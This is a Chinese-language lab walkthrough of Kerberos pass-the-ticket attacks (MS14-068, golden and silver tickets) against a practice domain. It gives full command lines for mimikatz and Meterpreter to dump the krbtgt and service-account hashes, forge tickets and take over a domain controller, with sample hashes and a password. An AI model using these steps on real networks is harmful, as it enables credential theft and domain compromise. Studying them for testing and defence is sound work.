PTT —票据传递攻击

PTT（票据传递攻击）是基于Kerberos认证的一种攻击方式，常用来做后渗透权限维持。
      三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket
黄金票据攻击利用的前提是得到了域内krbtgt用户的NTLM 哈希或AES-256的值；白银票据攻击利用的前提是得到了域内服务账号的NTLM 哈希或AES-256的值。

  • MS14-068

在kerberos 协议中，Client访问Server，需要知道是否具有访问权限。所以微软在KRB_AS_REP中的TGT中增加了Client的PAC（特权属性证书），也就是Client的权限，包括Client的User的SID、Group的SID。ms14-068 漏洞就是在经过身份验证的Client在TGT中伪造高权限的PAC。
  • 利用条件
1、域控没有打MS14-068的补丁（KB3011780）
2、攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid
  • 利用过程

（以靶机为例，已经拿到web服务器权限并发现存在域）

1、获得普通域用户sid

2、执行payload生成TGT票据

ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码

（MS14.068.exe 需自行下载并上传至服务器）

MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456生成的票据为TGT_web@hackbox.com.ccache


3、票据注入

执行mimikatz.exe（前期上传），将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限

（1）清除票据（如果有域成员凭证会影响凭证伪造）   kerberos::purge

（2）将票据注入到目标内存kerberos::ptc TGT_web@hackbox.com.ccache
ps:这里要将创建的票据放在mimikatz路径下，否则会注入失败

（3）查看票据 Kerberos::list

访问域控文件

  • 黄金票据（golden ticket）

在client与AS交互中，client使用自身hash加密timestamp发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以伪造任意用户的TGT票据进行client与TGS交互。

利用前提：

1、拿到域控
2、有krbtgt用户的hash值

伪造金票的所需条件:

1、域名称
2、域的SID值
3、域的KRBTGT账号的HASH
4、伪造任意用户名
  • 利用过程

以靶机为例

1、获取到域控权限后，在域控会话中使用wmic useraccount where name="krbtgt" get sid，获取sid

2、使用ps查看进程，选择HACKBOX\administrator对应进程进行迁移steal_token 2248

3、加载kiwi，使用dcsync_ntlm krbtgt查看krbtgt用户的NTLM hash值

以上，获取到的信息

1、域名称：hackbox.com
2、域的SID值：S-1-5-21-2005268815-658469957-1189185684-502
3、域的KRBTGT账号的HASH：6f60ace6accbcb76078ccc0312174e98

4、生成的黄金票据

黄金票据公式：

golden_ticket_create -d 域名 -u 任意用户名 -s SID(没有-502) -k NTLM -t　保存位置
golden_ticket_create -d hackbox.com -u hacktest -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t　/tmp/krbtgt.ticke

5、返回至web的session（这里要注意是在web服务的session不是在域控的session），加载kiwi load kiwi

6、清除票据（kerberos_ticket_purge），访问dc，查看能否访问，若不能，则这一步成功

7、使用kerberos_ticket_use /root/krbtgt.ticket 加载黄金票据。

8、访问域控成功

  • 白银票据（silver ticket）

如果有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。

    Ticket=Server Hash(Server Session Key+Client info+end time)

它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。

特点

1、不需要与KDC进行交互，直接和server认证
2、需要目标服务的NTLM Hash

伪造白银票据所需条件

1、要伪造的域用户(一般伪造administrator)
2、域名
3、域的SID值(就是域成员SID值去掉最后的一串值)
4、目标服务器上面的kerberos服务
5、域的服务账号的NTLM-hash
  • 制作白银票据

同上，以靶机为例

1、要伪造的域用户(一般伪造administrator)：administrator
2、域名 ：hackbox.com
3、域的SID值(就是域成员SID值去掉最后的一串值)：S-1-5-21-2005268815-658469957-1189185684
4、目标服务器上面的kerberos服务
5、域的服务账号的NTLM-hash：086a0bb1ed4ec72250760ea531bf8074

白银票据公式

1、获取到域权限后，将mimikatz上传至域控并执行sekurlsa::logonpasswords，得到daministrator hash

2、在域成员机上执行mimikatz，制作白银票据

白银票据公式：
kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLMHash> /user:<伪造的用户名> /ptt
kerberos::golden /domain:hackbox.com /sid:S-1-5-21-2005268815-658469957-1189185684 /target:DC.hackbox.com /service:cifs /rc4:086a0bb1ed4ec72250760ea531bf8074  /user:administrator /ptt

ps：这里service的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:

  • 银票与金票的不同点

访问权限不同 ；Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限 ；Silver Ticket: 伪造 TGS,只能访问指定的服务加密方式不同 ；Golden Ticket ：由 krbtgt 的 Hash 加密 ；Silver Ticket：由服务账号(通常为计算机账户)Hash 加密认证流程不同；Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要
